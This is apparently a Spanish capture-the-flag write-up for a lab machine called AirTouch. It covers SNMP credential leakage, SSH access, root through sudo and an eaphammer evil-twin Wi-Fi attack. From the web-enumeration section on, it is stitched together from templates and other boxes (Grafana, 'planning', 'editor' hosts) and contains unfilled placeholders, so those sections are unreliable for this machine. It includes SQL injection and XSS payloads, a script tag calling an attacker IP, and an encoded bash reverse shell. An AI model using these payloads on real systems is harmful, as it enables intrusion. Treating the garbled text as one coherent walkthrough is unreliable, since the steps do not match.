
# AirTouch

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `AirTouch`
* **IP:** `10.129.8.56`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sCV -T5 10.129.8.56
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bd:90:00:15:cf:4b:da:cb:c9:24:05:2b:01:ac:dc:3b (RSA)
|   256 6e:e2:44:70:3c:6b:00:57:16:66:2f:37:58:be:f5:c0 (ECDSA)
|_  256 ad:d5:d5:f0:0b:af:b2:11:67:5b:07:5c:8e:85:76:76 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos abierto el puerto 22 SSH, lo cual es muy extraño.

#### Escaneo UDP

```bash
sudo nmap -v -sU -T5 10.129.8.56
```

```bash
PORT    STATE SERVICE
161/udp open  snmp
```

Por UDP sólamente encontramos abierto el puerto 161 SNMP

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.8.56 airtouch.htb" | sudo tee -a /etc/hosts
```

### Enumeración SNMP

```bash
snmpwalk -v2c -c public 10.129.8.56

iso.3.6.1.2.1.1.1.0 = STRING: "\"The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)\""
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (4698951) 13:03:09.51
iso.3.6.1.2.1.1.4.0 = STRING: "admin@AirTouch.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "Consultant"
iso.3.6.1.2.1.1.6.0 = STRING: "\"Consultant pc\""
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
```

Al enumerar SNMP con snmpwalk encontramos una cuenta de adminstrador y una contraseña en texto plano.

### Acceso SSH

Con esas credenciales pordemos acceder por SSH con el usuario `consultant`:

```bash
ssh consultant@10.129.8.56

consultant@10.129.8.56's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

consultant@AirTouch-Consultant:~$ whoami
consultant
```

Al acceder solo encontramos dos imágenes en el directorio de consultant:

```bash
consultant@AirTouch-Consultant:~$ ls
diagram-net.png  photo_2023-03-01_22-04-52.png
```

Nos las descargaremos con SCP:

```bash
scp consultant@10.129.8.56:/home/consultant/\*.png .
consultant@10.129.8.56's password: 
diagram-net.png                                                                                                                      100%  129KB 474.7KB/s   00:00    
photo_2023-03-01_22-04-52.png                                                                                                        100%  726KB   1.9MB/s   00:00 
```

Esta es la imagen con el esquema de la red:

<figure><img src="/files/yoCchCokpzzCZpObNnAX" alt=""><figcaption></figcaption></figure>

### **Análisis del Diagrama de Red**

#### **Estructura de Red**

1. **Internet** → **NAT** (con reglas de redirección):
   * Puerto 22 externo → 172.20.1.2:22 (Consultant Laptop)
   * Puerto 161 externo → 172.20.1.2:161 (Consultant Laptop)
2. **VLANS identificadas:**
   * Consultant vlan
   * Tablets vlan
   * Corp vlan
3. **Redes y dispositivos:**
   * **Corporate computer**: `10.10.10.0/24`
   * **Consultant Laptop**: `172.20.1.2` (donde estamos actualmente)
   * **Tablet manager**: `192.168.3.0/24`
4. **SSIDs WiFi:**
   * AirTouch-Internet
   * AirTouch-Office

### Ver interfaces de red

```bash
consultant@AirTouch-Consultant:/home$ ip addr show

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if29: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 32:11:75:81:2a:f1 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.1.2/24 brd 172.20.1.255 scope global eth0
       valid_lft forever preferred_lft forever
7: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
8: wlan1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
9: wlan2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
10: wlan3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
11: wlan4: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
12: wlan5: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff
13: wlan6: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
```

```bash
consultant@AirTouch-Consultant:/home$ ip route
default via 172.20.1.1 dev eth0 
172.20.1.0/24 dev eth0 proto kernel scope link src 172.20.1.2 
```

Con esto confirmamos que estamos en la **Consultant Laptop (172.20.1.2)**. Ahora necesitamos explorar las otras redes. Veamos qué podemos alcanzar.

No tenemos ping para comprobar la conectividad con otras máquinas:

```bash
consultant@AirTouch-Consultant:/home$ ping -c 2 10.10.10.1
-bash: ping: command not found
```

Pero tenemos otras opciones:

```bash
consultant@AirTouch-Consultant:/home$ which nc telnet curl wget ssh nmap arp
/usr/bin/nc
/usr/bin/curl
/usr/bin/wget
/usr/bin/ssh
/usr/bin/nmap
/usr/sbin/arp
```

Tenemos nmap, por lo que podemos realizar escaneos de red interna.

#### Escaneo del gateway

```bash
consultant@AirTouch-Consultant:/home$ nmap -T4 -p- --min-rate=1000 172.20.1.1
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-18 19:30 UTC
Nmap scan report for 172.20.1.1
Host is up (0.00020s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
```

Solo tenemos SSH

#### Descubrir hosts internos

```bash
consultant@AirTouch-Consultant:/home$ nmap -sn 172.20.1.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-18 19:32 UTC
Nmap scan report for AirTouch (172.20.1.1)
Host is up (0.0028s latency).
Nmap scan report for AirTouch-Consultant (172.20.1.2)
Host is up (0.0019s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 7.22 seconds
```

Tenemos 2 máquinas: `172.20.1.1` y `172.20.1.2`

No podemos hacer traceroute ya que necesitamos ser root en la máquina. Vamos a intentar elevar privilegios.

### Privesc

El usuario consultant puede ejecutar cualquier comando:

```bash
consultant@AirTouch-Consultant:/home$ sudo -l

Matching Defaults entries for consultant on AirTouch-Consultant:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User consultant may run the following commands on AirTouch-Consultant:
    (ALL) NOPASSWD: ALL
```

Por lo que nos convertimos en root fácilmente:

```bash
consultant@AirTouch-Consultant:/home$ sudo su -
root@AirTouch-Consultant:~# whoami
root
```

### Enumeración como root

En el directorio /root encontramos un directorio eaphammer. **Eaphammer** es una herramienta para ataques a redes WiFi Enterprise (EAP). Esto explica las múltiples interfaces wlan0-wlan6. Vamos a investigar:

```bash
root@AirTouch-Consultant:~# ls
eaphammer
```

{% embed url="<https://github.com/s0lst1c3/eaphammer>" %}

Seguiremos los pasos del repositorio:

#### Instalar certificados

```bash
root@AirTouch-Consultant:~/eaphammer# ./eaphammer --cert-wizard

                     .__                                         
  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|   
     \/     \/|__|        \/     \/      \/      \/     \/       


                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com

    
[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Please enter two letter country code for certs (i.e. US, FR)
: ES
[*] Please enter state or province for certs (i.e. Ontario, New Jersey)
: Madrid
[*] Please enter locale for certs (i.e. London, Hong Kong)
: Madrid
[*] Please enter organization for certs (i.e. Evil Corp)
: Evil Corp
[*] Please enter org unit for certs (i.e. Hooman Resource Says)
: HR
[*] Please enter email for certs (i.e. cyberz@h4x0r.lulz)
: test@test.es
[*] Please enter common name (CN) for certs.
: certs
[CW] Creating CA cert and key pair...
[CW] Complete!
[CW] Writing CA cert and key pair to disk...
[CW] New CA cert and private key written to: /root/eaphammer/certs/ca/certs.pem
[CW] Complete!
[CW] Creating server private key...
[CW] Complete!
[CW] Using server private key to create CSR...
[CW] Complete!
[CW] Creating server cert using CSR and signing it with CA key...
[CW] Complete!
[CW] Writing server cert and key pair to disk...
[CW] Complete!
[CW] Activating full certificate chain...
[CW] Complete!
```

#### Evil Twin Attack

Debemos proporcionarle un SSID que ya exista, en este caso `AirTouch-Office` para conseguir una contraseña para acceder a un ordenador corporativo:

<figure><img src="/files/YOErsnweLQvIQnpVXDR2" alt=""><figcaption></figcaption></figure>

```bash
root@AirTouch-Consultant:~/eaphammer# ./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid AirTouch-Office --creds

                     .__                                         
  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|   
     \/     \/|__|        \/     \/      \/      \/     \/       


                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com

    
[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Saving current iptables configuration...
[*] Reticulating radio frequency splines...
Error: Could not create NMClient object: Could not connect: No such file or directory.

[*] Using nmcli to tell NetworkManager not to manage wlan0...

100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]

[*] Success: wlan0 no longer controlled by NetworkManager.
[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-01-18-20-00-57-E51K0orqd9DeRBzAkVqkTVQ0EA5K4g4K.hccapx

Configuration file: /root/eaphammer/tmp/hostapd-2026-01-18-20-00-57-FAgpXgxAX1mKmIuJDojC8cf1307tzLwK.conf
[hostapd] AP starting...

rfkill: Cannot open RFKILL control device
wlan0: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan0 with hwaddr 00:11:22:33:44:00 and ssid "AirTouch-Internet"
wlan0: interface state COUNTRY_UPDATE->ENABLED
wlan0: AP-ENABLED 


Press enter to quit...
```

Esperamos un rato y no conseguimos ningún handshake, por lo que cambiamos el enfoque, vamos a buscar logs del programa:

```bash
find /root/eaphammer -type f -name "*.log" -o -name "*.txt" | xargs cat 2>/dev/null | grep -i "pass\|user\|key\|cred"
```

***

## <mark style="color:purple;">Enumeración Web</mark>

### Testing de Formularios

* Probar inyecciones SQL y XSS:
  * `' OR '1'='1`
  * `<script>alert(1)</script>`
* Observar mensajes, errores, cambios de comportamiento
* Herramientas: Burp Suite, sqlmap, wfuzz

Probamos distintas técnicas de inyección SQL/XSS sin éxito.

### Fuzzing de Directorios

```bash
dirsearch -u http://planning.htb -x 404
```

```bash
gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirb/common.txt
```

```bash
ffuf -u http://planning.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Directorios encontrados:**

* `/about.php`
* `/contact.php`
* `/js/` (403)
* `/lib/` (403)

No se encuentran datos sensibles directamente accesibles.

### Análisis de vulnerabilidades

```bash
nuclei -u planning.htb
```

***

## <mark style="color:purple;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.10.11.68 -H "Host: defnotvalid.planning.htb" | grep "Content-Length:"

Content-Length: 178
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.11.68/ -H 'Host: FUZZ.planning.htb' -fs 178
```

**Encontramos el subdominio:** `grafana.planning.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de Grafana v11.0.0.

***

## <mark style="color:purple;">Explotación</mark>

### Prueba de XSS (si hay forms)

Probaremos el siguiente script en los campos del formulario para ver si es vulnerable a Cross Site Scipting (XSS):

```javascript
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```

Cambiamos la IP por la nuestra y iniciamos un listener con `Netcat` en el puerto 9000. Hacemos clic en el botón `Send` y comprobamos si el listener recibe una llamada para confirmar la vulnerabilidad.

```shell-session
afsh4ck@kali$ nc -lvnp 9000
```

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con Grafana 11.0.0 en fuentes como:

* <https://sploitus.com>
* <https://exploit-db.com>
* <https://github.com>

**Exploit seleccionado:** *(Describir qué exploit se usó y su URL de referencia)*

### Ejecución del Exploit

Describir paso a paso cómo se logró la ejecución remota o el primer acceso.

### Estabilizar sesión

Usaremos Penelope para estabilizar nuestra sesión y tener persistencia:

{% embed url="<https://github.com/brightio/penelope>" %}

```bash
pipx install git+https://github.com/brightio/penelope

penelope
```

<figure><img src="/files/QFe2CD0y7qzQGRsfXtv4" alt=""><figcaption></figcaption></figure>

Usaremos el payload en bash de la sección `tun0`, ya que estamos conectados por VPN:

```bash
➤  tun0 → 10.10.15.3:4444

Bash TCP
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
```

Lo ejecutamos en la máquina objetivo:

```shell-session
nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.15.3] from (UNKNOWN) [10.10.11.92] 50602
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls
conversor.htb
$ printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
$ 
```

Y automáticamente recibimos la shell PTY con persistencia:

{% hint style="warning" %}
Con F12 podemos cerrar la sesión para interactuar con ella más tarde
{% endhint %}

<figure><img src="/files/oUGF21qJR5YQYE3Xk3kI" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Acceso Inicial</mark>

Una vez obtenido acceso:

* Verificar usuario actual (`whoami`)
* Verificar entorno (`uname -a`, `id`, `sudo -l`)

***

## <mark style="color:purple;">User Flag</mark>

Ubicación y obtención de la flag del usuario:

```bash
cat /home/<usuario>/user.txt
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario Oliver:

```shell-session
oliver@editor:/tmp$ sudo -l                                                        
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
```

### Versión de SUDO

```shell-session
ike@expressway:~$ sudo -V
Sudo version 1.9.17
```

Esta versión de sudo es vulnerable al CVE-2025-32463, y encontramos varios PoC para explotarlo.

### Enumeración de archivos con permisos especiales

Buscando archivos con permisos especiales, encontré un archivo `ndsudo` sospechoso:

```shell-session
oliver@editor:/tmp$ find / -user root -perm -4000 -print 2>/dev/null

/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```

### Ver servicios internos corriendo

```shell-session
oliver@editor:/tmp$ ss -tuln

Netid State   Recv-Q  Send-Q        Local Address:Port    Peer Address:Port Process 
udp   UNCONN  0       0                 127.0.0.1:8125         0.0.0.0:*            
udp   UNCONN  0       0             127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN  0       128                 0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN  0       4096          127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN  0       511                 0.0.0.0:80           0.0.0.0:*            
tcp   LISTEN  0       151               127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:19999        0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:8125         0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:45249        0.0.0.0:*            
tcp   LISTEN  0       70                127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN  0       5                   0.0.0.0:8000         0.0.0.0:*            
tcp   LISTEN  0       128                    [::]:22              [::]:*            
tcp   LISTEN  0       511                    [::]:80              [::]:*            
tcp   LISTEN  0       50       [::ffff:127.0.0.1]:8079               *:*            
tcp   LISTEN  0       50                        *:8080               *:*   
```

Herramientas usadas:

* `sudo -l`
* `find / -perm -4000 2>/dev/null`
* `linpeas.sh`
* `pspy`

#### Técnica aplicada

Describir la técnica usada: binario con SUID, cronjob mal configurado, credenciales duras, etc.

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
cat /root/root.txt
```
